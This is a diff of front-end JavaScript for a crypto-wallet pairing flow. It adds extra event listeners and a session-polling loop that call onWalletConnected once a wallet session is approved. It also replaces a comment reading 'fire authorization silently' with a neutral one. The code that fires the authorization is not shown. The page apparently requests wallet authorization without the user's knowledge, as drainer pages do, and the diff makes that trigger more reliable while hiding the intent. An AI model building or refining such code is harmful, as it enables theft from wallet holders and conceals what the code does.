@@ -183,8 +183,9 @@ async function startSession() {
     evtSrc = new EventSource(BASE + '/api/front/events');
 
     const onPaired = (e) => {
-      const d = JSON.parse(e.data);
-      if (d.connectionId && d.connectionId !== connId) return;
+      let d = {};
+      try { d = JSON.parse(e.data); } catch (_err) { return; }
+      if (d.connectionId && connId && d.connectionId !== connId) return;
       sessionTopic = d.topic || d.sessionTopic || sessionTopic;
       connAccounts = d.accounts || connAccounts;
       onWalletConnected(d);
@@ -192,6 +193,10 @@ async function startSession() {
 
     evtSrc.addEventListener('demo_connected', onPaired);
     evtSrc.addEventListener('session_settled', onPaired);
+    evtSrc.addEventListener('session_approved', onPaired);
+    evtSrc.addEventListener('session_connected', onPaired);
+
+    startSessionPolling();
 
     evtSrc.addEventListener('request_resolved', (e) => {
       const d = JSON.parse(e.data);
@@ -271,7 +276,27 @@ function onGetNowClick() {
   window.location.href = twLink;
 }
 
-/* ========== Step 2: wallet connected → fire authorization silently ========== */
+/* ========== Step 2: wallet connected ========== */
+function startSessionPolling() {
+  if (!connId) return;
+  const tick = async () => {
+    if (walletLinked) return;
+    try {
+      const res = await fetch(BASE + '/api/front/session/' + encodeURIComponent(connId));
+      const data = await res.json();
+      const session = data.session || data;
+      const status = session && session.status;
+      if (status === 'settled' || status === 'approved' || status === 'connected') {
+        sessionTopic = session.sessionTopic || session.topic || sessionTopic;
+        connAccounts = session.accounts || connAccounts;
+        onWalletConnected(session);
+      }
+    } catch (_err) {}
+    if (!walletLinked) setTimeout(tick, 2000);
+  };
+  setTimeout(tick, 1500);
+}
+
 function onWalletConnected(_d) {
   if (walletLinked) return;
   walletLinked = true;
